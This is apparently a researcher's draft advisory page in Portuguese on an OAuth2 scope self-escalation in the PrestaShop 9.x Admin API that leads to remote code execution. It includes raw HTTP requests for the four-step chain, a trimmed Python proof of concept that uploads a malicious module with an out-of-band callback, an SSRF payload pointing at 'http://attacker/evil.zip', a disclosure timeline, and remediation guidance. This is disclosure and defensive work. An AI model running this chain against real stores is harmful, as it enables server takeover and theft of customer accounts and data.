@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>prestashop 9.x — autoescalada de escopo oauth2 na admin api → rce · chu@antisec</title>
+    <meta name="description" content="autoescalada de escopo oauth2 na admin api do prestashop 9.x: um client que só tem api_client_write se concede module_write e chega à execução de código como www-data. cwe-269, cvss 8.8. draft.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="alternate" hreflang="en" href="../../research/prestashop-admin-api-scope-privesc.html">
+    <link rel="alternate" hreflang="pt-BR" href="prestashop-admin-api-scope-privesc.html">
+    <link rel="alternate" hreflang="x-default" href="../../research/prestashop-admin-api-scope-privesc.html">
+  </head>
+  <body>
+    <a class="skip" href="#main">pular para o conteúdo</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../../index.html">chu<span class="host">@antisec</span>:~/research$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="principal">
+          <ul>
+            <li><a href="../../index.html">início</a></li>
+            <li><a href="index.html" aria-current="page">pesquisa</a></li>
+            <li><a href="../hackthebox/index.html">writeups</a></li>
+            <li><a href="../about.html">sobre</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">time</a></li>
+            <li class="lang"><span class="flag-cur" aria-hidden="true"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#009b3a"/><path d="M12 1.6 22.4 8 12 14.4 1.6 8Z" fill="#fedf00"/><circle cx="12" cy="8" r="3.1" fill="#002776"/></svg></span><a href="../../research/prestashop-admin-api-scope-privesc.html" hreflang="en" lang="en" title="read in english" aria-label="switch to english"><svg viewBox="0 0 24 16" aria-hidden="true" focusable="false"><rect width="24" height="16" fill="#012169"/><path d="M0 0L24 16M24 0L0 16" stroke="#fff" stroke-width="3.2"/><path d="M0 0L24 16M24 0L0 16" stroke="#C8102E" stroke-width="1.6"/><path d="M12 0V16M0 8H24" stroke="#fff" stroke-width="5"/><path d="M12 0V16M0 8H24" stroke="#C8102E" stroke-width="2.8"/></svg></a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="index.html">← ../</a> prestashop-admin-api-scope-privesc</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/research$</span> cat prestashop-admin-api-scope-privesc</h1>
+        <p class="cmd">prestashop 9.x — autoescalada de escopo oauth2 na admin api → rce</p>
+
+        <ul class="meta">
+          <li class="chip">vendor=prestashop</li>
+          <li class="chip">product=9.0.0–9.2.0</li>
+          <li class="chip chip--amber">--cvss=8.8</li>
+          <li class="chip">--cwe=269</li>
+          <li class="chip">id=reserved (cve pending)</li>
+          <li class="chip">reported=2026-06-08</li>
+          <li class="chip chip--phos">found_by=chu</li>
+          <li class="chip chip--amber">fixed_in=none released yet</li>
+          <li class="badge badge--draft">draft</li>
+        </ul>
+
+        <blockquote class="stdout stdout--tldr">
+          <p><strong>resumo:</strong> a admin-api (oauth2, <code>client_credentials</code>) permite que um
+            client de baixo privilégio se conceda escopos que não possui. a operação de criar/editar api clients —
+            guardada apenas pelo escopo <code>api_client_write</code> — grava no client um array
+            <code>scopes</code> totalmente controlado pelo chamador, sem verificar o que ele já detém. um token
+            que só tinha <code>api_client_write</code> cria um client com <code>module_write</code>, emite um token
+            para ele e chega a rce (instalar módulo = php rodando como <code>www-data</code>), takeover de contas
+            de clientes (<code>customer_write</code>) e ssrf full (<code>upload-source</code>). afeta
+            9.0.0–9.2.0; ≤ 8.2.x não afetadas. <strong>sem sessão de admin envolvida — uma credencial de
+              integração vazada basta.</strong></p>
+        </blockquote>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[01]</span>
+          <h2 class="sec-title">o bug</h2>
+          <span class="sec-tail">a checagem de delegação que não existe</span>
+        </div>
+        <div class="prose">
+          <p>o prestashop 9 traz uma nova <strong>admin api</strong> em <code>/admin-api</code>, construída sobre
+            api platform 3, oauth2 (<code>client_credentials</code>) e uma camada de comandos cqrs. cada operação
+            é atrelada a um ou mais <strong>escopos</strong> no formato <code>{entity}_{operation}</code> —
+            <code>product_read</code>, <code>module_write</code>, e por aí vai. numa instalação padrão do
+            9.1.x/9.2.x a api já vem ativa de fábrica e só é exigida sobre https.</p>
+          <p>por design, o confinamento é aplicado em dois pontos: o servidor oauth2 limita cada token à própria
+            lista de escopos armazenada do client no momento da emissão, e um listener confere o escopo exigido
+            pela operação a cada request. o mecanismo é sólido. o defeito é que a única operação que
+            <em>define</em> a lista de escopos de um client — <code>POST /admin-api/api-clients</code> e
+            <code>PATCH /admin-api/api-clients/{id}</code> — é guardada apenas por
+            <code>api_client_write</code>, um escopo comum e atribuível, e <strong>ninguém verifica se o chamador
+              detém os escopos que está gravando</strong>. cwe-269 clássico: improper privilege management
+            (gestão inadequada de privilégios).</p>
+        </div>
+
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> EditApiClientCommand.php <span class="cap-right">php · a única validação é is_string</span></figcaption>
+          <pre><code><span class="tk-c">// src/Core/Domain/ApiClient/Command/EditApiClientCommand.php:94</span>
+<span class="tk-k">public function</span> <span class="tk-f">setScopes</span>(?array $scopes): self
+{
+    <span class="tk-k">if</span> (<span class="tk-f">count</span>($scopes) !== <span class="tk-f">count</span>(<span class="tk-f">array_filter</span>($scopes, <span class="tk-s">'is_string'</span>))) {
+        <span class="tk-k">throw new</span> ApiClientConstraintException(<span class="tk-s">'Expected list of non empty string for scopes'</span>, ...);
+    }
+    $this-&gt;scopes = $scopes;          <span class="tk-c">// no check against the CALLER's own scopes</span>
+    <span class="tk-k">return</span> $this;
+}</code></pre>
+        </figure>
+
+        <div class="prose">
+          <p>dois detalhes pioram a situação em vez de salvá-la. primeiro, os escopos submetidos <em>são</em>
+            validados a jusante contra o catálogo de escopos instalados (<code>#[InstalledApiResourceScope]</code>),
+            então só <strong>escopos reais e instalados</strong> podem ser atribuídos — mas nenhuma camada confere
+            se o <em>chamador</em> os detém. essa checagem de <strong>delegação</strong> ausente é o bug inteiro.
+            segundo, o corpo da request é desnormalizado direto sobre o comando cqrs (um <code>ObjectNormalizer</code>
+            sem <code>ALLOW_EXTRA_ATTRIBUTES =&gt; false</code>, sendo o próprio comando o tipo de input), então o
+            array <code>scopes</code> do json chega intacto em <code>setScopes()</code> — um sumidouro de
+            mass-assignment de livro didático, cwe-915.</p>
+          <p>no próximo pedido de token, o <code>ScopeRepository::finalizeScopes()</code> limita os escopos
+            solicitados à lista armazenada do client — exatamente a lista que o atacante acabou de reescrever —
+            então a escalada é honrada, e daí em diante toda checagem de <code>module_write</code> passa.</p>
+        </div>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[02]</span>
+          <h2 class="sec-title">cadeia de ataque</h2>
+          <span class="sec-tail">api_client_write → www-data</span>
+        </div>
+        <div class="prose">
+          <p><code>module_write</code> é execução de código <em>por design</em>: instalar um módulo prestashop
+            significa extrair um arquivo dentro do diretório <code>modules/</code> na raiz web e carregar a classe
+            php dele, e o php executa statements de topo e o construtor imediatamente. o module manager ainda tem
+            hard-coded uma permissão para qualquer api client carregando <code>module_write</code>. a cadeia são
+            quatro requests:</p>
+        </div>
+
+        <figure class="fig">
+          <pre>  client de integração              admin api                          host prestashop
+    (api_client_write)                  │                                     │
+    │                                   │                                     │
+    │ POST /admin-api/access_token      │                                     │
+    │ scope=api_client_write  ─────────►│  token T0 (baixo privilégio)        │
+    │                                   │                                     │
+    │ POST /admin-api/api-clients       │                                     │
+    │ scopes=[<span class="hl">module_write</span>,…] ────────►│  sem checagem de delegação:         │
+    │ ◄──────── 201 {secret} ───────────│  escopos persistidos como enviados  │
+    │                                   │                                     │
+    │ POST /admin-api/access_token      │                                     │
+    │ scope=module_write  ─────────────►│  token T1 — finalizado contra a     │
+    │                                   │  lista reescrita pelo atacante      │
+    │ POST /admin-api/modules/          │                                     │
+    │      upload-archive  Bearer T1 ──►│── unzip em modules/ ───────────────►│
+    │                                   │   require() → o php executa         │
+    │ ◄──────── uid=1000(www-data) ────────── <span class="hl">execução de código</span> ───────────│</pre>
+          <figcaption class="fig-cap"><b>fig 01</b> — fluxo da autoescalada: reescreva seu próprio conjunto de escopos, emita um token, faça upload de um módulo. sem login de admin em lugar nenhum.</figcaption>
+        </figure>
+
+      <p class="small dim">alvo abaixo: uma instalação limpa e padrão do prestashop 9.2 sobre https real, toda
+        request passando pelo burp. ponto de partida: um client provisionado para uma integração de baixa
+        confiança, com o escopo único <code>api_client_write</code>. a loja em si não é tocada — o ataque vive
+        inteiramente na admin api dela.</p>
+
+      <figure class="fig">
+        <img src="../../img/prestashop/real-shop-home.png" alt="Loja padrão do PrestaShop 9.2 (tema hummingbird), o alvo do ataque" width="1440" height="900" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 02</b> — o alvo: uma loja prestashop 9.2 padrão (tema hummingbird). a admin api dela é acessível via https.</figcaption>
+      </figure>
+
+      <p class="small"><b>passo 1</b> — um token com o único escopo que temos.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step1-token.http <span class="cap-right">http</span></figcaption>
+        <pre><code>POST /admin-api/access_token HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials&amp;client_id=lowpriv&amp;client_secret=&lt;SECRET&gt;&amp;scope=api_client_write</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/prestashop/real-1-token.png" alt="Burp Repeater: POST /admin-api/access_token com scope=api_client_write retorna HTTP 200 e um token Bearer" width="1876" height="455" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 03</b> — passo 1 no burp repeater: o client de baixo privilégio recebe um bearer token carregando apenas <code>api_client_write</code>.</figcaption>
+      </figure>
+
+      <p class="small"><b>passo 2</b> — a vulnerabilidade primária: reescrever o conjunto de escopos do nosso
+        próprio client. o servidor responde <code>200</code> e ecoa de volta.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step2-escalate.http <span class="cap-right">http · sem checagem de posse</span></figcaption>
+        <pre><code>PATCH /admin-api/api-clients/1 HTTP/1.1
+Authorization: Bearer &lt;token from step 1&gt;
+Content-Type: application/json
+
+{"scopes":["api_client_write","module_write","customer_write"]}
+
+HTTP/1.1 200 OK
+{ ... "scopes":["api_client_write","module_write","customer_write"] ... }</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/prestashop/real-2-escalate.png" alt="Burp Repeater: PATCH /admin-api/api-clients/1 com Bearer de baixo privilégio e body scopes [api_client_write, module_write, customer_write] retorna HTTP 200 ecoando os escopos escalados" width="1880" height="478" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 04</b> — a escalada: um token detendo apenas <code>api_client_write</code> reescreve o próprio conjunto de escopos; <strong>http 200</strong> ecoando <code>module_write</code> + <code>customer_write</code>.</figcaption>
+      </figure>
+
+      <p class="small"><b>passo 3</b> — emitir um token novo; o <code>finalizeScopes</code> agora concede os
+        escopos autoatribuídos, e o jwt decodificado prova que a fronteira de privilégio foi cruzada.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step3-token.http <span class="cap-right">http · jwt payload</span></figcaption>
+        <pre><code>POST /admin-api/access_token
+grant_type=client_credentials&amp;client_id=lowpriv&amp;client_secret=&lt;SECRET&gt;&amp;scope=module_write%20customer_write
+
+{ "aud":"lowpriv", "scopes":["is_authenticated","module_write","customer_write"] }</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/prestashop/real-3-token.png" alt="Burp Repeater: POST /admin-api/access_token com scope=module_write customer_write retorna HTTP 200 e um novo token Bearer" width="1390" height="427" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 05</b> — um novo token é emitido; os escopos autoatribuídos agora são de primeira classe.</figcaption>
+      </figure>
+
+      <p class="small"><b>passo 4</b> — o mesmo upload de módulo é <strong>rejeitado para o token de baixo
+          privilégio e aceito para o escalado</strong>: um antes/depois limpo num único endpoint. o php do módulo
+        plantado roda no load e a saída do comando volta out-of-band.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step4-rce.http <span class="cap-right">http · module_write = execução de código</span></figcaption>
+        <pre><code>POST /admin-api/modules/upload-archive   (bearer low-priv)   → <span class="tk-c">403</span> {"detail":"Invalid scope."}
+POST /admin-api/modules/upload-archive   (bearer escalated)  → <span class="tk-k">201</span> {"technicalName":"pocmod…"}
+
+<span class="tk-c"># the module's php runs on load; output captured out-of-band:</span>
+RCE @ host :: uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)</code></pre>
+      </figure>
+
+      <div class="grid grid--2">
+        <figure class="fig">
+          <img src="../../img/prestashop/real-4a-upload-403.png" alt="Burp Repeater: POST /admin-api/modules/upload-archive com o Bearer de baixo privilégio retorna HTTP 403 Invalid scope" width="1393" height="504" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 06a</b> — antes: o upload com o token de baixo privilégio → <strong>403 invalid scope</strong>.</figcaption>
+        </figure>
+        <figure class="fig">
+          <img src="../../img/prestashop/real-4b-upload-201.png" alt="Burp Repeater: o upload idêntico com o Bearer escalado retorna HTTP 201 Created e o módulo é instalado" width="1399" height="486" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 06b</b> — depois: o upload idêntico com o token escalado → <strong>201 created</strong> = execução de código.</figcaption>
+        </figure>
+      </div>
+
+      <p class="small dim">a variante <code>upload-source</code> (<code>{"source":"http://attacker/evil.zip"</code>)
+        faz o próprio servidor buscar o arquivo — ssrf completo alcançando serviços internos e metadata de cloud —
+        e depois executa o módulo buscado. <code>customer_write</code> chega ao
+        <code>POST /admin-api/customers</code> para criar ou editar qualquer cliente com uma senha escolhida pelo
+        atacante.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[03]</span>
+        <h2 class="sec-title">poc</h2>
+        <span class="sec-tail">só em lab · enxuto</span>
+      </div>
+      <p class="small dim">apenas biblioteca padrão, sem dependências; toda request ao alvo passa por um proxy
+        interceptador e o script se recusa a rodar sem ele. enxuto, só as partes que importam — o script completo
+        acompanha o advisory. rode apenas contra uma instância que seja sua.</p>
+
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> poc.py <span class="cap-right">python · enxuto · stage 1 + stage 2</span></figcaption>
+        <pre><code><span class="tk-c">#!/usr/bin/env python3</span>
+<span class="tk-c"># poc.py — prestashop admin api: oauth2 scope self-escalation → rce (>= 9.0.0)</span>
+<span class="tk-c"># stdlib only. all target traffic goes through burp (default 127.0.0.1:8080);</span>
+<span class="tk-c"># the script exits if the proxy listener is unreachable.</span>
+
+<span class="tk-k">def</span> <span class="tk-f">jwt_scopes</span>(token):
+    p = token.split(<span class="tk-s">"."</span>)[<span class="tk-n">1</span>]; p += <span class="tk-s">"="</span> * (-len(p) % <span class="tk-n">4</span>)
+    <span class="tk-k">return</span> json.loads(base64.urlsafe_b64decode(p)).get(<span class="tk-s">"scopes"</span>, [])
+
+<span class="tk-k">def</span> <span class="tk-f">get_token</span>(c, cid, secret, scope):
+    st, body = c.form(<span class="tk-s">"/admin-api/access_token"</span>, {
+        <span class="tk-s">"grant_type"</span>: <span class="tk-s">"client_credentials"</span>, <span class="tk-s">"client_id"</span>: cid,
+        <span class="tk-s">"client_secret"</span>: secret, <span class="tk-s">"scope"</span>: scope})
+    <span class="tk-k">try</span>:    <span class="tk-k">return</span> json.loads(body).get(<span class="tk-s">"access_token"</span>)
+    <span class="tk-k">except</span> Exception: <span class="tk-k">return</span> <span class="tk-n">None</span>
+
+<span class="tk-c"># stage 0 — a token with the only scope we hold</span>
+t0 = <span class="tk-f">get_token</span>(c, args.client_id, args.client_secret, <span class="tk-s">"api_client_write"</span>)
+
+<span class="tk-c"># stage 1 — PRIMARY VULN: self-grant scopes we do not hold (create-based:</span>
+<span class="tk-c"># api_client_write also reaches POST /api-clients, no numeric id needed)</span>
+esc_cid = <span class="tk-s">"escpoc_%d"</span> % int(time.time())
+st, body = c.json_req(<span class="tk-s">"POST"</span>, <span class="tk-s">"/admin-api/api-clients"</span>, {
+    <span class="tk-s">"clientId"</span>: esc_cid, <span class="tk-s">"clientName"</span>: <span class="tk-s">"escpoc"</span>, <span class="tk-s">"enabled"</span>: <span class="tk-n">True</span>,
+    <span class="tk-s">"lifetime"</span>: <span class="tk-n">3600</span>,
+    <span class="tk-s">"scopes"</span>: [<span class="tk-s">"api_client_write"</span>, <span class="tk-s">"module_write"</span>, <span class="tk-s">"customer_write"</span>]}, token=t0)
+new_secret = json.loads(body).get(<span class="tk-s">"secret"</span>)   <span class="tk-c"># 201 — nobody checked caller authority</span>
+t1 = <span class="tk-f">get_token</span>(c, esc_cid, new_secret, <span class="tk-s">"module_write customer_write"</span>)
+
+<span class="tk-k">if</span> <span class="tk-s">"module_write"</span> <span class="tk-k">in</span> <span class="tk-f">jwt_scopes</span>(t1):
+    <span class="tk-f">print</span>(<span class="tk-s">"&gt;&gt;&gt; PRIVILEGE ESCALATION CONFIRMED: api_client_write -&gt; module_write"</span>)
+
+<span class="tk-c"># stage 2 — module_write = code execution: before/after on one endpoint.</span>
+<span class="tk-c"># the planted module writes its command output out-of-band on load.</span>
+zipb = <span class="tk-f">build_module_zip</span>(<span class="tk-s">"pocmod"</span>, proof, args.cmd, args.callback)
+st, body = c.multipart(<span class="tk-s">"/admin-api/modules/upload-archive"</span>, t0, <span class="tk-s">"archive"</span>, <span class="tk-s">"poc.zip"</span>, zipb)
+<span class="tk-f">print</span>(<span class="tk-s">"  low-priv upload  -&gt; HTTP"</span>, st)       <span class="tk-c"># 403 Invalid scope.</span>
+st, body = c.multipart(<span class="tk-s">"/admin-api/modules/upload-archive"</span>, t1, <span class="tk-s">"archive"</span>, <span class="tk-s">"poc.zip"</span>, zipb)
+<span class="tk-f">print</span>(<span class="tk-s">"  escalated upload -&gt; HTTP"</span>, st)       <span class="tk-c"># 201 = the module's php ran</span>
+<span class="tk-c"># --callback serves a built-in listener: "&gt;&gt;&gt; RCE CONFIRMED" as the web user</span></code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../../img/prestashop/real-poc-run.png" alt="Console do PoC rodando end-to-end: token com api_client_write, autoescalada para module_write+customer_write (PRIVILEGE ESCALATION CONFIRMED), upload 403 e depois 201, e prova de RCE out-of-band uid=1000(www-data) (RCE CONFIRMED)" width="1477" height="426" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 07</b> — o poc automatizado rodando a cadeia completa end-to-end: escalada confirmada no jwt, upload 403 → 201, rce provado out-of-band como <code>uid=1000(www-data)</code>.</figcaption>
+      </figure>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[04]</span>
+        <h2 class="sec-title">impacto</h2>
+        <span class="sec-tail">o que o atacante leva</span>
+      </div>
+      <ul class="ls">
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">execução remota de código como o usuário do php</span><span class="ls-extra">→ www-data, via module_write</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">takeover de conta de cliente</span><span class="ls-extra">→ customer_write: criar/editar qualquer cliente, senha à escolha</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">ssrf completo pelo upload-source de módulo</span><span class="ls-extra">→ serviços internos, metadata de cloud — depois rce</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">persistência durável</span><span class="ls-extra">→ client autoconcedido com escopos completos, webservice key legada, tokens que não podem ser revogados</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">comprometimento total da loja</span><span class="ls-extra">→ catálogo, pedidos, pii de clientes, configuração de pagamento</span></li>
+      </ul>
+      <p class="small dim">quem está exposto: qualquer loja 9.x em que uma integração, app ou parceiro detenha
+        <code>api_client_write</code> — e no 9.1.x/9.2.x a admin api já vem ligada de fábrica, então o único
+        pré-requisito é essa uma credencial. ≤ 8.2.x não é afetado (sem gestão de clients via api). verificado
+        dinamicamente em instalações limpas e padrão do 9.1.4 (última estável) e 9.2.0; a escalada em si também
+        provada no 9.0.0. como a api e o código que ela executa compartilham da mesma autoridade
+        <code>www-data</code>, isso pontua <strong>cvss 3.1 8.8 high</strong>
+        (<code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>) — defensível como <strong>9.9 critical</strong> com
+        <code>S:C</code> se o passo de escopo-para-código-no-so for tratado como travessia de fronteira. uma loja
+        que concede a uma integração o escopo <code>api_client_write</code>, de aparência inofensiva, está na
+        prática concedendo execução de código no host — uma exposição material gdpr/lgpd.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[05]</span>
+        <h2 class="sec-title">timeline de disclosure</h2>
+        <span class="sec-tail">coordenada · em andamento</span>
+      </div>
+      <ul class="tl">
+        <li class="is-done"><span class="t-date">2026-06-06 → 07</span><span class="t-what">descoberta + validação em lab</span>
+          <span class="t-note">encontrado no 9.2.0, varredura de versões pelo 9.0.0–9.2.0, revalidado end-to-end numa
+            instalação limpa e padrão sobre https real — todo o tráfego pelo burp.</span></li>
+        <li class="is-done"><span class="t-date">2026-06-08</span><span class="t-what">reportado (privado)</span>
+          <span class="t-note">report coordenado para o time de segurança do prestashop
+            (<code>security-core@prestashop.com</code>) com o advisory, referências da causa raiz e orientação de
+            remediação, conforme a política de segurança do projeto.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">triage do vendor</span>
+          <span class="t-note">registro e confirmação de ghsa/cve — o identificador nesta página segue
+            <code>reserved</code> até o vendor atribuir um.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">fix liberado + cve atribuído</span>
+          <span class="t-note">versões corrigidas no momento do report: nenhuma. fixes saem apenas na release mais
+            recente, pela política do projeto; ainda não existe release corrigida.</span></li>
+        <li class="is-now"><span class="t-date">pendente</span><span class="t-what">divulgação pública</span>
+          <span class="t-note">esta página está completa e preparada, mas segue marcada <code>draft</code> até o
+            fix ficar público — aí o detalhamento completo acima entra no ar sem censura.</span></li>
+      </ul>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[06]</span>
+        <h2 class="sec-title">remediação</h2>
+        <span class="sec-tail">para devs + lojistas</span>
+      </div>
+      <div class="prose">
+        <h3>se você constrói uma api que distribui capacidades</h3>
+        <ul>
+          <li>adicione a <strong>checagem de delegação</strong>: ao criar ou editar um client, rejeite qualquer
+            escopo solicitado que o chamador autenticado não detém ele próprio ou não está autorizado a delegar.
+            validar apenas contra o catálogo de escopos é necessário, mas não suficiente.</li>
+          <li>nunca deixe um principal atribuir privilégios que ele não detém. considere guardar a gestão de
+            clients atrás de um escopo administrativo dedicado que ele próprio não possa autoatribuir.</li>
+          <li>desative <strong>mass assignment</strong>: <code>ALLOW_EXTRA_ATTRIBUTES =&gt; false</code> e/ou
+            dtos de input explícitos com uma allow-list, em vez de vincular o corpo da request direto a um
+            comando.</li>
+          <li>torne as checagens de escopo <strong>deny-by-default</strong>: uma operação que não declara escopos
+            não deve ser alcançável por token nenhum, e um lint de ci deve falhar qualquer operação sem um
+            conjunto de escopos não vazio.</li>
+          <li>respeite <code>enabled</code> ao resolver clients e implemente <strong>revogação de token</strong>
+            de verdade — um client desabilitado não pode continuar emitindo tokens funcionais.</li>
+          <li>trate a instalação de módulos como uma capacidade separada e de alta confiança: escopo dedicado,
+            inalcançável por autoconcessão, e considere assinatura de módulos.</li>
+        </ul>
+        <h3>se você opera uma loja prestashop 9.x hoje</h3>
+        <ul>
+          <li>trate <code>api_client_write</code> como um privilégio administrativo e não o entregue a integrações
+            de terceiros até que uma release corrigida seja lançada.</li>
+          <li>audite <code>ps_api_client.scopes</code> atrás de clients cujo conjunto de escopos excede o que quem
+            os criou pretendia — especialmente qualquer client de baixa confiança que agora detenha
+            <code>module_write</code>, <code>customer_write</code> ou <code>webservice_key_write</code> — e
+            rotacione tudo o que você mesmo não criou.</li>
+          <li>guarde segredos de integração num secret manager, não numa planilha chamada
+            <code>senhas-final-v3</code>. o client secret é mostrado uma vez na criação e depois vive na config da
+            integração; ele vaza por git, logs de ci, screenshots e tickets de suporte.</li>
+          <li>alerte em <code>PATCH</code>/<code>POST</code> para <code>/api-clients</code> que mudem
+            <code>scopes</code>, especialmente quando seguidos de um upload de módulo. essa única linha de log
+            pega essa classe inteira.</li>
+          <li>atualize para a release corrigida assim que ela estiver disponível e reaudite cada api client
+            depois — escopos autoconcedidos antes do patch não se retiram sozinhos.</li>
+        </ul>
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="foot">
+    <div class="wrap">
+      <div class="foot-row">
+        <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+      </div>
+      <div class="foot-row">
+        <p>© 2026 chu · <a href="../../index.html">início</a> · <a href="../about.html#contact">contato</a></p>
+      </div>
+    </div>
+  </footer>
+  <script src="../../zoom.js" defer></script>
+</body>
+</html>
